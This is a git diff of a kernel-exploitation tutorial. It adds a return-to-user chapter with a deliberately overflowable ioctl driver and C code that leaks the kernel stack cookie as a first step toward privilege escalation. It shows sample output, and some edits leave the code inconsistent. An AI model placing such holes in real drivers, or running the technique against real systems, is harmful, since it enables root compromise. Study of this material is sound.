@@ -15,6 +15,8 @@
 	 * [Cleaning up previous exploit ](#cleaning-up-previous-exploit)  
 	 * [Getting root shell](#getting-root-shell)  
 * [Return-to-user](#return-to-user)  
+	 * [Writing ioctl kernel driver](#writing-ioctl-kernel-driver)  
+	 * [Returning to the userland](#returning-to-the-userland)
 
 ## Creating the enviornment and the first kernel module
 
@@ -322,8 +324,8 @@ uid=0(root) gid=1000 groups=1000
 #
 ```  
 
-# Return-to-user  
-## Writing ioctl kernel driver  
+## Return-to-user  
+### Writing ioctl kernel driver  
 To start this chapter, we need an other kind of kernel driver: one, which uses ioctl to handle IO. This can be done by adding `.unlocked_ioctl` to the file operations struct:  
 ```C
 static struct file_operations file_ops = {
@@ -357,17 +359,16 @@ In STACK_WRITE, the driver handles the arg as a pointer to the input from user-s
 ```C
 get_user(size, (unsigned long *)arg);
 
-error_count = copy_from_user(msg_ptr,(unsigned long *)(arg+8), size);
+error_count = copy_from_user(msg_buffer,(unsigned long *)(arg+8), size);
 if(error_count == 0){
 	return 0;
 }else{
 	return -EFAULT;
 }
 ```  
-`msg_ptr` is just pointing to a char array, which is used as a local buffer on the stack. That's where the input will be stored.  
+`msg_buffer` is the buffer on the stack, that we are going to be using for exploitation:   
 ```C
-char msg_buffer[256] = {0};
-char *msg_ptr = msg_buffer;
+int msg_buffer[256] = {0};
 ```  
 STACK_READ does basically the same, but there is `copy_to_user()` instead of "from".  
 One more trick has been used here later. Because of a safety check, we cannot read more bytes from a buffer with `copy_to_user`, than the length of the buffer. This is a check made by the compiler and there is a documentation about it: [Object Size Checking](https://gcc.gnu.org/onlinedocs/gcc/Object-Size-Checking.html)  
@@ -386,12 +387,51 @@ And this can be used easily both in READ_STACK and in WRITE_STACK:
 ```C
 //WRITE_STACK
 ...
-error_count = copy_user(msg_ptr,(unsigned long *)(arg+8), size, IN);
+error_count = copy_user(msg_ptr,(unsigned long *)(arg+8), size * sizeof(int), IN);
 ...
 //READ_STACK
 ...
-error_count = copy_user(msg_ptr, (unsigned long*)(arg+8), size, OUT);
+error_count = copy_user(msg_ptr, (unsigned long*)(arg+8), size * sizeof(int), OUT);
 ...
 ```  
 With this we are done with the kernel driver, we can move on to the exploitation.  
 
+### Returning to the userland  
+The exploit works this way: we perform a buffer overflow on the kernel stack, modifying the return address to an address from userland and there we will perform a privilege escalation. We can do this, because by returning from our kernel driver directly to our userland code, we will still be operating in kernel mode, and we will have the privilege to raise the privilege level of our user space program.  
+First, we need to leak the stack cookie from the kernel stack to be able to perform the exploit. For that, we can use the READ_STACK ioctl command on our device driver file. For that, we need a structure, that is gonna be read by the driver:  
+```C
+typedef struct read_write_stack{
+	unsigned long size;
+	long msg[MAX_MSG];
+} read_write_stack;
+```  
+The `MAX_MSG` macro is set to 1024, because we need something larger than the buffer in the driver (any size above 300 would suffice). To use this struct, we need to allocate it on the heap, because we need to pass a pointer to the ioctl driver.  
+```C
+read_write_stack* receiver = (read_write_stack*)malloc(sizeof(unsigned long) + MAX_MSG * sizeof(long));
+receiver->size = 280;
+```  
+So, how does the STACK_READ work with our struct? The struct contains an unsigned long, that contains the size of the text in the buffer, if we write, but if we read, it means that we want to read that amount of bytes. So if we set this to a bigger size than the kernel buffer, we will leak the content of the stack.  
+```C
+printf("[+] Trying to read from kernel stack...\n");
+ret = ioctl(fd, READ_STACK, (unsigned long)receiver);
+if(ret < 0){
+	printf("[-] Failed to read from kernel stack\n");
+	free(receiver);
+	exit(-1);
+}
+ ```  
+From the returned data we are able to gather the stack cookie. Because we know, that the size of the buffer is 256 int, and we read it to a long array, we only need some educated to find out, that the stack cookie will be in the 129-th element of the msg buffer: the first 128 is the size of kernel buffer divided by 2 (size of int: 4 bytes, size of long: 8 bytes), and after that comes the stack cookie. That's, how we got it:  
+ ```C
+printf("[+] Received message\n");
+printf("[+] Stack cookie: 0x%lx\n", receiver->msg[128]);
+long stack_cookie = receiver->msg[128];
+```  
+This looks something like this while running:  
+```
+# ./ret2user 
+[+] Opening device file...
+[+] Trying to read from kernel stack...
+[   36.411329] Stack read
+[+] Received message
+[+] Stack cookie: 0xeb9458cb2481e00
+```  
